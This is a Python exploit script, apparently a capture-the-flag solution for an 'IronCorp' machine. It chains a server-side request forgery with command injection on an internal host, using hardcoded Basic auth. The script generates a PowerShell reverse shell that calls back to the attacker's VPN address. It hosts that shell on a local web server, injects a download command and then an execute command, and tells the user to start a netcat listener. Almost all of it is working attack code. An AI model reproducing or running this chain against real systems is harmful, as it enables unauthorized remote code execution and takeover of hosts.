import sys
import psutil
import http.server
import socketserver
import threading
import requests
import time
import urllib.parse
import netifaces as ni

def urlencode(str):
  return urllib.parse.quote(str)


def urldecode(str):
  return urllib.parse.unquote(str)

banner = r'''
 _____                        ____
|_   _|                      / ____|                    ( )
  | |   _ __   ___   _ __   | |       ___   _ __  _ __  |/  ___
  | |  | '__| / _ \ | '_ \  | |      / _ \ | '__|| '_ \    / __| 
 _|  _ | |   | (_) || | | | | |____ | (_) || |   | |_) |   \__ \ 
|_____||_|    \___/ |_| |_|  \_____| \___/ |_|   | .__/    |___/
                                                 | |
                                                 |_|
 _____              _
|  __ \            | |
| |  | |  ___  ___ | |_  _ __   ___   _   _   ___  _ __ 
| |  | | / _ \/ __|| __|| '__| / _ \ | | | | / _ \| '__|
| |__| ||  __/\__ \| |_ | |   | (_) || |_| ||  __/| |   
|_____/  \___||___/ \__||_|    \___/  \__, | \___||_|   
                                       __/ |            
                                       |___/         

                      Created by Gutierre0x80
        [+]███████████████████████████████████████████
'''
print(banner)
url = "http://admin.ironcorp.me:11025/?r="
ssrf = 'http://internal.ironcorp.me:11025/name.php?name=Equinox|'
headers = {
    "Authorization": "Basic YWRtaW46cGFzc3dvcmQxMjM="
}

#Validate if you were sufficiently capable of having read the instructions for use. -> Check if a is listening on port 9001
def check_port(port_rce):
    for conn in psutil.net_connections():
        if conn.status == psutil.CONN_LISTEN and conn.laddr.port == port_rce:
            return True
    return False

def main():
    port_rce = 9001  

    if not check_port(port_rce):
        print("Just execute 'nc -vnlp 9001.")
        sys.exit()
if __name__ == "__main__":
    main()


#Your VPN IP 
ip_vpn = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

#Validate if port 1234 is in use
def check_port(port):
    for conn in psutil.net_connections():
        if conn.status == psutil.CONN_LISTEN and conn.laddr.port == port:
            return True
    return False

port_web = 1234

def main():
    global port_web  
    if check_port(port_web):
        port_web += 1
if __name__ == "__main__":
    main()


#Create the shell.ps1
content_shell = ("$client = New-Object System.Net.Sockets.TCPClient('"
         + ip_vpn
         + "',9001);"
         "$stream = $client.GetStream();"
         "[byte[]]$bytes = 0..65535|%{0};"
         "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
         "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
         "$sendback = (iex $data 2>&1 | Out-String);"
         "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
         "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
         "$stream.Write($sendbyte,0,$sendbyte.Length);"
         "$stream.Flush()}"
         "$client.Close()")

locate_shell = "shell.ps1"

with open(locate_shell, "w") as arquivo:
    arquivo.write(content_shell)

#Payload for download your shell in target

download_payload = r'powershell.exe Invoke-WebRequest http://' + ip_vpn + r':' + str(port_web) + r'/shell.ps1" -OutFile "E:\xampp\htdocs\internal\shell.ps1"'

PayloadDownload = ''
payload_download_encoded = urlencode(download_payload)
download_encoded = ssrf + "" + payload_download_encoded

for character in download_encoded:
    PayloadDownload = PayloadDownload + "%" + (hex(ord(character))[2:]).lower()

#Function for execute  your shell in target

PayloadExecute = ''
execute = ssrf + "" +"powershell.exe%20./shell.ps1"

for character in execute:
    PayloadExecute = PayloadExecute + "%" + (hex(ord(character))[2:]).lower()

time.sleep(1)
 
#WebServer to download exploit

SSRFDownload = url + '' + PayloadDownload

handler = http.server.SimpleHTTPRequestHandler
class MyHandler(handler):
    def translate_path(self, path):
        path = super().translate_path(path)
        if path.endswith('/'):
            path += 'shell.ps1'
        return path
class WebServer:
    def __init__(self):
        self.server = socketserver.TCPServer(("", port_web), MyHandler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.shutdown_timer = threading.Timer(9, self.shutdown_server)
    def start(self):
        print(f"Web server started on: {port_web}. If the request from ironcorp.me does not appear. Try again\n")
        self.server_thread.start()
        self.shutdown_timer.start()
        dfinal = requests.get(SSRFDownload, headers=headers)

    def shutdown_server(self):
        self.server.shutdown()
        self.server.server_close()
        print("Server shut down.")

web_server = WebServer()
web_server.start()

while web_server.server_thread.is_alive():
    time.sleep(1)

#Execute the exploit in the target

SSRFExecute = url + '' + PayloadExecute

import time

def countdown():
    for i in range(3, 0, -1):
        print("Shell Reverse in", i, end='\r')
        time.sleep(1)

countdown()

efinal = requests.get(SSRFExecute, headers=headers)
